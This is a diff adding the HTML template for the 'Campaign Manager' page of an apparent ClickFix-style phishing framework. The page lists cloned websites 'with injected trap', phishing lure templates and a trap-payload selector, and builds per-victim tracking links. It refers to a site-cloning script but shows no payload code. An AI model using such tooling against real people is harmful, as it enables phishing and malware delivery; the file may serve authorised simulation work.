@@ -1,0 +1,172 @@
+{% extends "base_layout.html" %}
+
+{% block title %}ClickFix - Campaign Manager{% endblock %}
+
+{% block extra_css %}
+<style>
+    .manager-header {
+        background: linear-gradient(135deg, #f8fafc 0%, #e2e8f0 100%);
+        padding: 4rem 0 3rem;
+        margin-bottom: 2rem;
+        border-bottom: 1px solid var(--color-border);
+    }
+    .grid-lures {
+        display: grid;
+        grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+        gap: 1.5rem;
+    }
+    .lure-card {
+        background: white;
+        border: 1px solid var(--color-border);
+        border-radius: var(--radius-lg);
+        padding: 1.5rem;
+        transition: all 0.2s;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+    }
+    .lure-card:hover {
+        transform: translateY(-4px);
+        box-shadow: var(--shadow-md);
+        border-color: var(--color-primary);
+    }
+    .lure-icon {
+        width: 40px;
+        height: 40px;
+        background: #eff6ff;
+        color: var(--color-primary);
+        border-radius: 50%;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-bottom: 1rem;
+    }
+    .campaign-badge {
+        background: #fff7ed;
+        color: #c2410c;
+        font-size: 0.75rem;
+        padding: 0.25rem 0.75rem;
+        border-radius: 99px;
+        font-weight: 600;
+        align-self: flex-start;
+        margin-bottom: 0.5rem;
+    }
+</style>
+{% endblock %}
+
+{% block content %}
+<div class="manager-header">
+    <div class="container">
+        <div class="flex justify-between items-end" style="flex-wrap: wrap; gap: 1rem;">
+            <div>
+                <h1 class="mb-2">Campaign Manager</h1>
+                <p class="text-muted" style="font-size: 1.2rem;">Select a lure or campaign to generate a tracking link.</p>
+            </div>
+            
+            <!-- Trap Selector -->
+            <div class="card mb-0" style="padding: 1rem; border-color: var(--color-primary); background: #f0f9ff; min-width: 300px;">
+                <label for="trap-select" class="form-label" style="color: var(--color-primary);"><strong>Override Trap Payload</strong></label>
+                <div class="flex gap-2">
+                    <select id="trap-select" class="form-control form-select">
+                        <option value="">Default (Use Template Setting)</option>
+                        {% for trap in traps %}
+                        <option value="{{ trap }}">{{ trap | replace('_', ' ') | title }}</option>
+                        {% endfor %}
+                    </select>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div class="container" style="padding-bottom: 6rem;">
+    
+    <!-- Active Campaigns -->
+    <div class="flex items-center gap-2 mb-6">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><line x1="2" y1="12" x2="22" y2="12"/><path d="M12 2a15.3 15.3 0 0 1 4 10 15.3 15.3 0 0 1-4 10 15.3 15.3 0 0 1 4-10z"/></svg>
+        <h2>Cloned Campaigns</h2>
+    </div>
+    
+    <div class="grid-lures mb-8">
+        {% for campaign in campaigns %}
+        <div class="lure-card">
+            <div>
+                <div class="campaign-badge">CLONED SITE</div>
+                <h3 class="text-lg font-bold mb-2">{{ campaign | replace('_', ' ') | title }}</h3>
+                <p class="text-muted text-sm mb-4">Full website clone with injected trap.</p>
+            </div>
+            <div class="flex gap-2 mt-4">
+                <button class="btn btn-outline w-full" onclick="copyLink('{{ campaign }}')">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="mr-2"><rect x="9" y="9" width="13" height="13" rx="2" ry="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
+                    Copy Link
+                </button>
+                <a href="/s/{{ campaign }}?uid=demo_victim" class="btn btn-primary w-full" target="_blank" onclick="return updateLink(this, '{{ campaign }}')">
+                    Demo
+                </a>
+            </div>
+        </div>
+        {% else %}
+        <div class="col-span-full text-center py-8 text-muted card">
+            <p>No active campaigns found.</p>
+            <p class="text-sm">Use <code>python cloner.py <url> <name></code> to create one.</p>
+        </div>
+        {% endfor %}
+    </div>
+
+    <!-- Standard Lures -->
+    <div class="flex items-center gap-2 mb-6">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/><polyline points="10 9 9 9 8 9"/></svg>
+        <h2>Standard Templates</h2>
+    </div>
+
+    <div class="grid-lures">
+        {% for lure in lures %}
+        <div class="lure-card">
+            <div>
+                <div class="lure-icon">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
+                </div>
+                <h3 class="text-lg font-bold mb-2">{{ lure | replace('_', ' ') | title }}</h3>
+                <p class="text-muted text-sm mb-4">Standard phishing template.</p>
+            </div>
+            <div class="flex gap-2 mt-4">
+                <button class="btn btn-outline w-full" onclick="copyLink('{{ lure }}')">
+                    Copy Link
+                </button>
+                <a href="/s/{{ lure }}?uid=demo_victim" class="btn btn-primary w-full" target="_blank" onclick="return updateLink(this, '{{ lure }}')">
+                    Demo
+                </a>
+            </div>
+        </div>
+        {% endfor %}
+    </div>
+</div>
+
+{% include "components/admin_nav.html" %}
+
+<script>
+    function getTrapParam() {
+        const trap = document.getElementById('trap-select').value;
+        return trap ? `&t=${trap}` : '';
+    }
+
+    function updateLink(element, scenario) {
+        const trapParam = getTrapParam();
+        element.href = `/s/${scenario}?uid=demo_victim${trapParam}`;
+        return true;
+    }
+
+    function copyLink(scenario) {
+        const trapParam = getTrapParam();
+        let link = `${window.location.origin}/s/${scenario}`;
+        
+        if (trapParam) {
+            link += trapParam.replace('&', '?');
+        }
+        
+        navigator.clipboard.writeText(link).then(() => {
+            ClickFixUI.toast('Link copied: ' + link, 'success');
+        });
+    }
+</script>
+{% endblock %}
